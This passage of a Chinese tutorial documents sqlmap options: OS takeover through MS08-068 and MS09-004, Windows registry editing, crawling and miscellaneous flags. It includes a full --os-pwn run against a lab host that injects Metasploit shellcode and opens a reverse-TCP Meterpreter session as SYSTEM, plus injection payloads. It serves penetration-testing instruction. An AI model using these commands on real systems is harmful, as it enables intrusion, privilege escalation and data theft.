+利用远程代码执行漏洞MS08-068。攻击者的机器要用Metasploit的smb_relay监听来自目标机器的连接。要求在Linux/Unix上以root权限运行Sqlmap且目标DBMS在Windows上以管理员权限运行。参数：“–os-smbrelay”。
+在微软SQL Server 2000和2005中可通过存储过程sp_replwritetovarbin的堆缓冲区溢出漏洞（MS09-004）在内存中执行Metasploit的shellcode。Sqlmap有自己的数据执行保护绕过技术可以成功利用漏洞，但需要Metasploit生成shellcode以便在成功利用漏洞时执行shellcode。参数：“–os-bof”。</code></pre><p>下面是以MySQL为目标的例子：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1"</span> --os-pwn --msf-path /software/metasploit</span><br><span class="line"> </span><br><span class="line">[...]</span><br><span class="line">[hh:mm:31] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Windows 2003</span><br><span class="line">web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0</span><br><span class="line">back-end DBMS: MySQL 5.0</span><br><span class="line">[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system</span><br><span class="line">[hh:mm:31] [INFO] the back-end DBMS operating system is Windows</span><br><span class="line">how <span class="hljs-keyword">do</span> you want to establish the tunnel?</span><br><span class="line">[1] TCP: Metasploit Framework (default)</span><br><span class="line">[2] ICMP: icmpsh - ICMP tunneling</span><br><span class="line">&gt;</span><br><span class="line">[hh:mm:32] [INFO] testing <span class="hljs-keyword">if</span> current user is DBA</span><br><span class="line">[hh:mm:32] [INFO] fetching current user</span><br><span class="line">what is the back-end database management system architecture?</span><br><span class="line">[1] 32-bit (default)</span><br><span class="line">[2] 64-bit</span><br><span class="line">&gt;</span><br><span class="line">[hh:mm:33] [INFO] checking <span class="hljs-keyword">if</span> UDF <span class="hljs-string">'sys_bineval'</span> already exist</span><br><span class="line">[hh:mm:33] [INFO] checking <span class="hljs-keyword">if</span> UDF <span class="hljs-string">'sys_exec'</span> already exist</span><br><span class="line">[hh:mm:33] [INFO] detecting back-end DBMS version from its banner</span><br><span class="line">[hh:mm:33] [INFO] retrieving MySQL base directory absolute path</span><br><span class="line">[hh:mm:34] [INFO] creating UDF <span class="hljs-string">'sys_bineval'</span> from the binary UDF file</span><br><span class="line">[hh:mm:34] [INFO] creating UDF <span class="hljs-string">'sys_exec'</span> from the binary UDF file</span><br><span class="line">how <span class="hljs-keyword">do</span> you want to execute the Metasploit shellcode on the back-end database und</span><br><span class="line">erlying operating system?</span><br><span class="line">[1] Via UDF <span class="hljs-string">'sys_bineval'</span> (<span class="hljs-keyword">in</span>-memory way, anti-forensics, default)</span><br><span class="line">[2] Stand-alone payload stager (file system way)</span><br><span class="line">&gt;</span><br><span class="line">[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode</span><br><span class="line"><span class="hljs-built_in">which</span> connection <span class="hljs-built_in">type</span> <span class="hljs-keyword">do</span> you want to use?</span><br><span class="line">[1] Reverse TCP: Connect back from the database host to this machine (default)</span><br><span class="line">[2] Reverse TCP: Try to connect back from the database host to this machine, on</span><br><span class="line">all ports</span><br><span class="line">between the specified and 65535</span><br><span class="line">[3] Bind TCP: Listen on the database host <span class="hljs-keyword">for</span> a connection</span><br><span class="line">&gt;</span><br><span class="line"><span class="hljs-built_in">which</span> is the <span class="hljs-built_in">local</span> address? [192.168.136.1]</span><br><span class="line"><span class="hljs-built_in">which</span> <span class="hljs-built_in">local</span> port number <span class="hljs-keyword">do</span> you want to use? [60641]</span><br><span class="line"><span class="hljs-built_in">which</span> payload <span class="hljs-keyword">do</span> you want to use?</span><br><span class="line">[1] Meterpreter (default)</span><br><span class="line">[2] Shell</span><br><span class="line">[3] VNC</span><br><span class="line">&gt;</span><br><span class="line">[hh:mm:40] [INFO] creation <span class="hljs-keyword">in</span> progress ... <span class="hljs-keyword">done</span></span><br><span class="line">[hh:mm:43] [INFO] running Metasploit Framework <span class="hljs-built_in">command</span> line interface locally, please <span class="hljs-built_in">wait</span>..</span><br><span class="line"> </span><br><span class="line">=[ metasploit v3.7.0-dev [core:3.7 api:1.0]</span><br><span class="line">+ -- --=[ 674 exploits - 351 auxiliary</span><br><span class="line">+ -- --=[ 217 payloads - 27 encoders - 8 nops</span><br><span class="line">=[ svn r12272 updated 4 days ago (2011.04.07)</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">EXITFUNC =&gt; thread</span><br><span class="line">LPORT =&gt; 60641</span><br><span class="line">LHOST =&gt; 192.168.136.1</span><br><span class="line">[*] Started reverse handler on 192.168.136.1:60641</span><br><span class="line">[*] Starting the payload handler...</span><br><span class="line">[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF <span class="hljs-string">'sys_bineval'</span>, please <span class="hljs-built_in">wait</span>..</span><br><span class="line">[*] Sending stage (749056 bytes) to 192.168.136.129</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.136.1:60641 -&gt; 192.168.136.129:1689) at Mon Apr 11 hh:mm:52 +0100 2011</span><br><span class="line">meterpreter &gt; Loading extension espia...success.</span><br><span class="line">meterpreter &gt; Loading extension incognito...success.</span><br><span class="line">meterpreter &gt; [-] The <span class="hljs-string">'priv'</span> extension has already been loaded.</span><br><span class="line">meterpreter &gt; Loading extension sniffer...success.</span><br><span class="line">meterpreter &gt; System Language : en_US</span><br><span class="line">OS            : Windows .NET Server (Build 3790, Service Pack 2).</span><br><span class="line">Computer      : W2K3R2</span><br><span class="line">Architecture  : x86</span><br><span class="line">Meterpreter   : x86/win32</span><br><span class="line">meterpreter &gt; Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"> </span><br><span class="line">MS TCP Loopback interface</span><br><span class="line">Hardware MAC: 00:00:00:00:00:00</span><br><span class="line">IP Address : 127.0.0.1</span><br><span class="line">Netmask    : 255.0.0.0</span><br><span class="line"> </span><br><span class="line">Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC: 00:0c:29:<span class="hljs-built_in">fc</span>:79:39</span><br><span class="line">IP Address : 192.168.136.129</span><br><span class="line">Netmask    : 255.255.255.0</span><br><span class="line"> </span><br><span class="line">meterpreter &gt; <span class="hljs-built_in">exit</span></span><br><span class="line">[*] Meterpreter session 1 closed. Reason: User <span class="hljs-built_in">exit</span></span><br></pre></td></tr></table></figure>
+<p>在Windows中Mysql默认以SYSTEM身份运行，但PostgreSQL无论是在Windows还是在Linux中都以低权限的用户postgres运行。SQL Server 2000默认以SYSTEM身份运行，但SQL Server 2005到2008大多数时间以NETWORK SERVICE身份运行，少数时候以LOCAL SERVICE身份运行。</p>
+<p>使用参数“–priv-esc”可以执行Metasploit的getsystem命令以尝试提升权限。</p>
+<h3 id="0x11-Windows注册表操作"><a href="#0x11-Windows注册表操作" class="headerlink" title="0x11 Windows注册表操作"></a>0x11 Windows注册表操作</h3><p>满足以下条件就可以对Windows注册表进行操作：</p>
+<pre><code>目标数据库管理系统是运行在Windows上的
+目标数据库管理系统是MySQL、PostgreSQL或微软SQL Server
+支持堆查询
+目标数据库管理系统当前用户有足够的权限</code></pre><p><strong><em>1.读Windows注册表键值</em></strong><br><strong>参数：–reg-read</strong><br><strong><em>2.写Windows注册表键值</em></strong><br><strong>参数：–reg-add</strong><br><strong><em>3.删除Windows注册表键值</em></strong><br><strong>参数：–reg-del</strong><br><strong><em>4.辅助</em></strong><br><strong>参数：–reg-key、–reg-value、–reg-data和–reg-type</strong><br>适当使用上列参数就可以在命令中添加或修改一个Windows注册表键值而不用在Sqlmap运行时以问答方式提供数据。</p>
+<pre><code>–reg-key：指定Windows注册表键值的路径
+–reg-value：指定Windows注册表键值的键
+–reg-data：指定Windows注册表键值的值
+–reg-type：指定Windows注册表键值的值的数据类型</code></pre><p>下面是一个例子：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key=<span class="hljs-string">"HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap"</span> --reg-value=Test --reg-type=REG_SZ --reg-data=1</span><br></pre></td></tr></table></figure>
+<h3 id="0x12-通用选项"><a href="#0x12-通用选项" class="headerlink" title="0x12 通用选项"></a>0x12 通用选项</h3><p><strong><em>1.从SQLite文件中载入Sqlmap会话</em></strong><br><strong>参数：-s</strong><br>Sqlmap会自动地为每一个目标创建长久保存的会话SQLite文件，该文件统一存储在特定目录（如：~/.sqlmap/output/）中，其中保存着恢复会话所需的所有数据。若用户想要明确地指定SQLite文件（例如想要将多个目标的数据存储到同一个SQLite文件中），可使用此参数。<br><strong><em>2.将HTTP(S)流量记录到日志文件中</em></strong><br><strong>参数：-t</strong><br>该参数后跟一个文件路径，用于将HTTP(S)请求和响应以文本格式记录到文件中作为日志。这样的日志在调试时是很有用的。<br><strong><em>3.非交互模式</em></strong><br><strong>参数：–batch</strong><br>使用该参数可以让Sqlmap以非交互模式运行，所有要求的输入都会取默认值。<br><strong><em>4.设置字符编码</em></strong><br><strong>参数：–charset</strong><br>为正确解码数据，Sqlmap会使用Web服务器提供的信息（如HTTP头部中字符编码的设置），或是使用第三方库chardet来启发式地确定字符编码。</p>
+<p>可以使用参数“–charset”来指定字符编码，如“–charset=GBK”。<br><strong><em>5.从目标URL开始爬取目标站点</em></strong><br><strong>参数：–crawl</strong><br>Sqlmap可以从目标URL开始爬取目标站点并收集可能存在漏洞的URL。使用该参数还需要设置爬取深度，深度是相对于开始爬取的目标URL而言的。只有所有新链接都被递归地访问过后才算爬取结束。建议该参数与“–delay”配合使用。</p>
+<p>下例的目标的MySQL：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.21.128/sqlmap/mysql/"</span> --batch --crawl=3</span><br></pre></td></tr></table></figure>
+<p>部分输出如下：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:53] [INFO] starting crawler</span><br><span class="line">[xx:xx:53] [INFO] searching <span class="hljs-keyword">for</span> links with depth 1</span><br><span class="line">[xx:xx:53] [WARNING] running <span class="hljs-keyword">in</span> a single-thread mode. This could take a <span class="hljs-keyword">while</span></span><br><span class="line">[xx:xx:53] [INFO] searching <span class="hljs-keyword">for</span> links with depth 2</span><br><span class="line">[xx:xx:54] [INFO] heuristics detected web page charset <span class="hljs-string">'ascii'</span></span><br><span class="line">[xx:xx:00] [INFO] 42/56 links visited (75%)</span><br></pre></td></tr></table></figure>
+<p><strong>参数：–crawl-exclude</strong><br>在此参数后跟一个正则表达式可以排除不想爬取的URL。若URL匹配正则，则不被爬取。如用“–crawl-exclude=logout”来排除所有含有字符串“logout”的URL。<br><strong><em>6.设置输出CSV文件中的分隔符</em></strong><br><strong>参数：–csv-del</strong><br>当数据被输出到CSV文件（–dump-format=CSV）时，默认以“,”分隔，可以使用此参数指定分隔符。如：“–csv-del=”;””。<br><strong><em>7.数据库管理系统认证凭据</em></strong><br><strong>参数：–dbms-cred</strong><br>在某些情况下由于数据库管理系统当前用户权限较低从而导致动作执行失败，此时可以用此参数提供admin用户认证凭据，Sqlmap就会对执行失败的部分特地使用“run as”机制（如：微软SQL Server的OPENROWSET）以admin用户身份重新执行失败的动作。当然，得知道admin用户认证凭据才行。<br><strong><em>8.数据输出格式</em></strong><br><strong>参数：–dump-format</strong><br>Sqlmap对列举的数据有三种不同的输出格式：CSV、HTML和SQLITE。默认为CSV格式，每个数据表都被保存到一个文本文件中，一行是一条记录，以逗号分隔（或是用“–csv-del”指定分隔符）。选择HTML格式，所有数据被保存在一个HTML文件中，数据存放在一个个table中。选择SQLITE格式，所有数据被保存在一个SQLITE文件中，SQLITE中表名和结构会和原表相同。<br><strong><em>9.估计完成时间</em></strong><br><strong>参数：–eta</strong><br>该参数用于显示估计的完成时间。下例是目标为Oracle的布尔型盲注：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1"</span> -b --eta</span><br></pre></td></tr></table></figure>
+<p>部分输出如下：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hh:mm:01] [INFO] the back-end DBMS is Oracle</span><br><span class="line">[hh:mm:01] [INFO] fetching banner</span><br><span class="line">[hh:mm:01] [INFO] retrieving the length of query output</span><br><span class="line">[hh:mm:01] [INFO] retrieved: 64</span><br><span class="line">17% [========&gt;                                           ] 11/64</span><br><span class="line"> </span><br><span class="line">Then:</span><br><span class="line"> </span><br><span class="line">100% [===================================================] 64/64</span><br><span class="line">[hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod</span><br><span class="line"> </span><br><span class="line">web application technology: PHP 5.2.6, Apache 2.2.9</span><br><span class="line">back-end DBMS: Oracle</span><br><span class="line">banner:</span><br><span class="line"><span class="hljs-string">'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'</span></span><br></pre></td></tr></table></figure>
+<p>如你所见，Sqlmap先计算查询输出的长度，然后估计完成时间，最后显示百分比进度条并统计已经接受的数据。<br><strong><em>10.刷新会话文件</em></strong><br><strong>参数：–flush-session</strong><br>使用该参数可以刷新会话文件，以避免Sqlmap默认的缓存机制可能造成的一些问题。使用该参数的前提是真正理解会话文件的概念。另外一个可行的方法是手工删除会话文件。<br><strong><em>11.解析和测试表单输入字段</em></strong><br><strong>参数：–forms</strong><br>除了用“-r”和“–data”来测试表单数据是否存在注入点外，还可以使用参数“–forms”来测试表单数据是否存在注入点。<br>同时使用参数“–forms”和“-u”，Sqlmap会解析目标URL（“-u”指定的那个URL）返回页面中的表单，测试表单是否有注入点，而不对目标URL进行注入测试。<br><strong><em>12.忽略会话文件中的查询结果</em></strong><br><strong>参数：-fresh-queries</strong><br>使用此参数用于忽略会话文件中的查询结果重新执行查询。<br><strong><em>13.对返回结果使用HEX函数</em></strong><br><strong>参数：–hex</strong><br>非ASCII数据很容易在传输时出错，使用hex函数可以将目标数据库中数据以十六进制返回。</p>
+<p>下例的目标是PostgreSQL：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1"</span> --banner --hex -v 3 --parse-errors</span><br></pre></td></tr></table></figure>
+
+<p>部分输出如下所示：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:14] [INFO] fetching banner</span><br><span class="line">[xx:xx:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR</span><br><span class="line">(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)</span><br><span class="line">[xx:xx:15] [INFO] parsed error message: <span class="hljs-string">'pg_query() [&lt;a href='</span>function.pg-query<span class="hljs-string">'&gt;function.pg-query&lt;/a&gt;]: Query failed: ERROR: invalid input syntax for type numeric: ":vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:" in &lt;b&gt;/var/www/sqlmap/libs/pgsql.inc.php&lt;/b&gt; on line &lt;b&gt;35&lt;/b&gt;'</span></span><br><span class="line">[xx:xx:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled by</span><br><span class="line">GCC gcc-4.3.real (Debian 4.3.2-1.1) 4.3.2</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>14.指定输出目录路径</em></strong><br><strong>参数：–output-dir</strong></p>
+<p>Sqlmap默认将会话文件和结果文件保存到某个子目录output中，可以使用此参数指定输出目录，如：“–output-dir=/tmp”。<br><strong><em>15.从响应中解析DBMS的错误信息</em></strong><br><strong>参数：–parse-errors</strong><br>若是Web应用被配置成Debug模式则很可能在HTTP响应页面中显示SQL错误信息。这些错误信息对于理解某操作失败的原因是很有用的。例如因为权限不足导致的失败错误信息是类似这样的：“Access denied for user ”。</p>
+<p>下例的目标是微软SQL Server：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1"</span> --parse-errors</span><br></pre></td></tr></table></figure>
+<p>部分输出如下所示：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:17] [INFO] ORDER BY technique seems to be usable. This should reduce the timeneeded to find the right number of query columns. Automatically extending the rangefor current UNION query injection technique <span class="hljs-built_in">test</span></span><br><span class="line">[xx:xx:17] [INFO] parsed error message: <span class="hljs-string">'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)</span></span><br><span class="line"><span class="hljs-string">[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10 is out of range of the number of items in the select list.</span></span><br><span class="line"><span class="hljs-string">&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;'</span></span><br><span class="line">[xx:xx:17] [INFO] parsed error message: <span class="hljs-string">'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)</span></span><br><span class="line"><span class="hljs-string">[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is out of range of the number of items in the select list.</span></span><br><span class="line"><span class="hljs-string">&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;'</span></span><br><span class="line">[xx:xx:17] [INFO] parsed error message: <span class="hljs-string">'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)</span></span><br><span class="line"><span class="hljs-string">[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is out of range of the number of items in the select list.</span></span><br><span class="line"><span class="hljs-string">&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;'</span></span><br><span class="line">[xx:xx:17] [INFO] target URL appears to have 3 columns <span class="hljs-keyword">in</span> query</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>16.指定中轴列</em></strong><br><strong>参数：–pivot-column</strong><br>有时（如在微软SQL Server、Sybase和SAP MaxDB中）由于缺乏类似机制不可以直接使用偏移m,n的方式列举数据表记录。在这种情况下，Sqlmap通过确定最适合的中轴列（最独特的值）来列举数据，中轴列的值稍后用于检索其他列值。<br>如果自动选择失败就需要使用该参数手动指定中轴列，如：“–pivot-column=id”。<br><strong><em>17.保存选项到配置文件中</em></strong><br><strong>参数：–save</strong><br>使用该参数可以保存Sqlmap命令行参数到配置文件中，该文件可编辑并且可以使用参数“-c”加载。配置文件是INI格式的。<br><strong><em>18.升级Sqlmap</em></strong><br><strong>参数：–update</strong><br>使用此参数可以升级Sqlmap，显然，需要能够连接互联网。万一执行失败，可以在Sqlmap安装目录中执行“git pull”来升级Sqlmap。在Windows中没有git命令可以使用SmartGit之类的git客户端。</p>
+<p>实际上“–update”和“git pull”以同样的方式升级Sqlmap，都是从git仓库中获取最新源代码。<br>强烈建议在报告bug前先升级Sqlmap。</p>
+<h3 id="0x13-杂项"><a href="#0x13-杂项" class="headerlink" title="0x13 杂项"></a>0x13 杂项</h3><p><strong><em>1.使用简写</em></strong><br><strong>参数：-z</strong><br>有些参数组合是被经常用到的，如“–batch –random-agent –ignore-proxy<br>–technique=BEU”，这样写一大串很不好看，在Sqlmap中，提供了一种简写的方式来缩短命令长度。</p>
+<p>利用参数“-z”，每个参数都可以只写前几个字母，如“–batch”可以简写为“bat”。简写的原则是能够有所区别、对应的参数唯一就行。各个参数用逗号隔开。如：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u <span class="hljs-string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure>
+<p>可以简写为：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -z <span class="hljs-string">"bat,randoma,ign,tec=BEU"</span> -u <span class="hljs-string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure>
+<p>再如：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u <span class="hljs-string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure>
+<p>可以简写为：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -z <span class="hljs-string">"ign,flu,bat,tec=U,dump,D=testdb,T=users"</span> -u <span class="hljs-string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure>
+<p><strong><em>2.在成功检测到注入点时报警</em></strong><br><strong>参数：–alert</strong><br>该参数用于在找到新的注入点时发出警报，后跟一个用于发出警报的命令，如：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r data.txt --alert <span class="hljs-string">"notify-send '找到漏洞了'"</span></span><br></pre></td></tr></table></figure>
+<p>部分输出如下：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[18:59:36] [INFO] GET parameter <span class="hljs-string">'couno'</span> appears to be <span class="hljs-string">'OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)'</span> injectable (with --not-string=<span class="hljs-string">"001"</span>)</span><br><span class="line">[18:59:36] [INFO] executing alerting shell <span class="hljs-built_in">command</span>(s) (<span class="hljs-string">'notify-send '</span>找到漏洞了<span class="hljs-string">''</span>)</span><br></pre></td></tr></table></figure>
+<p>上例中用于发出警报的命令是Ubuntu中的notify-send命令。<br><strong><em>3.设置问题的回答</em></strong><br><strong>参数：–answers</strong><br>使用“–batch”以非交互模式运行时所有问题都以按默认值作为回答。有时不想以默认值为答案又想使用非交互模式，此时可以使用参数“–answers”对特定问题进行回答，若回答多个问题，以逗号分隔。如：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"</span>--technique=E --answers=<span class="hljs-string">"extending=N"</span> --batch</span><br></pre></td></tr></table></figure>
+<p>部分输出如下：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:56] [INFO] testing for SQL injection on GET parameter &apos;id&apos; heuristic (parsing) test showed that the back-end DBMS could be &apos;MySQL&apos;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span><br><span class="line">[xx:xx:56] [INFO] do you want to include all tests for &apos;MySQL&apos; extending provided level (1) and risk (1)? [Y/n] N</span><br></pre></td></tr></table></figure>
+<p><strong><em>4.在成功检测到注入点时发出“嘟”声</em></strong><br><strong>参数：–beep</strong><br>使用此参数可以在成功检测到注入点时发出“嘟”声。使用“-m”从日志文件中检测大量网站时该参数会格外有用。<br><strong><em>5.清除Sqlmap创建的临时表和自定义函数</em></strong><br><strong>参数：–cleanup</strong><br>强烈推荐在测试结束后使用此参数清除Sqlmap创建的临时表和自定义函数，Sqlmap会尽可能地清除数据库管理系统和文件系统上的入侵痕迹。<br><strong><em>6.检查依赖</em></strong><br><strong>参数：–dependencies</strong><br>Sqlmap的有些功能依赖第三方库，在用到时发现没有这些库会报错退出。使用此参数可以检查依赖的第三方库是否安装，如：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py --dependencies</span><br></pre></td></tr></table></figure>
+<p>部分输出如下：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[*] starting at 19:16:05</span><br><span class="line">     </span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python-kinterbasdb'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'Firebird'</span>. Download from http://kinterbasdb.sourceforge.net/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python-pymssql'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'Sybase'</span>. Download from https://github.com/pymssql/pymssql</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python cx_Oracle'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'Oracle'</span>. Download from http://cx-oracle.sourceforge.net/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python-psycopg2'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'PostgreSQL'</span>. Download from http://initd.org/psycopg/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python ibm-db'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'IBM DB2'</span>. Download from https://github.com/ibmdb/python-ibmdb</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python jaydebeapi &amp; python-jpype'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'HSQLDB'</span>. Download from https://pypi.python.org/pypi/JayDeBeApi/ &amp; http://jpype.sourceforge.net/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python ibm-db'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS 